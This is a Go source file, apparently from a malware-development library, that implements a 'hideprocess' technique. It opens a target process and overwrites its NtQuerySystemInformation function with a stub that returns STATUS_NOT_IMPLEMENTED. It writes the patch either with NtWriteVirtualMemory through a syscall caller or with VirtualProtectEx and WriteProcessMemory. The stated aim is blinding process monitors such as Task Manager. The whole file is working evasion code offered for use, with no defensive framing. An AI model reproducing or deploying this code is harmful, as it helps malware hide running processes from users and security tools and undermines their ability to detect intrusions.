//go:build windows

package hideprocess

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// nqsiPatch overwrites NtQuerySystemInformation with "mov eax, 0xC0000002; ret"
// (STATUS_NOT_IMPLEMENTED). 6 bytes total.
var nqsiPatch = []byte{0xB8, 0x02, 0x00, 0x00, 0xC0, 0xC3}

// PatchProcessMonitor patches NtQuerySystemInformation in the target process
// so it always returns STATUS_NOT_IMPLEMENTED, blinding process monitors.
// Requires PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the target.
// caller may be nil (falls back to VirtualProtectEx + WriteProcessMemory).
func PatchProcessMonitor(pid int, caller *wsyscall.Caller) error {
	hProc, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// NtQuerySystemInformation has the same address in every process on Win8+
	// (ntdll ASLR is per-boot, shared across all processes via the same pages).
	if err := api.ProcNtQuerySystemInformation.Find(); err != nil {
		return fmt.Errorf("resolve NtQuerySystemInformation: %w", err)
	}
	target := api.ProcNtQuerySystemInformation.Addr()

	return remoteWrite(hProc, target, nqsiPatch, caller)
}

func remoteWrite(hProc windows.Handle, addr uintptr, patch []byte, caller *wsyscall.Caller) error {
	size := uintptr(len(patch))

	if caller != nil {
		r, err := caller.Call("NtWriteVirtualMemory",
			uintptr(hProc),
			addr,
			uintptr(unsafe.Pointer(&patch[0])),
			uintptr(len(patch)),
			0,
		)
		if r != 0 {
			return fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
		}
		return nil
	}

	var oldProtect uint32
	if err := windows.VirtualProtectEx(hProc, addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(hProc, addr, &patch[0], size, &written); err != nil {
		// Restore protection even on write failure.
		var dummy uint32
		windows.VirtualProtectEx(hProc, addr, size, oldProtect, &dummy) //nolint:errcheck
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	var dummy uint32
	windows.VirtualProtectEx(hProc, addr, size, oldProtect, &dummy) //nolint:errcheck
	return nil
}
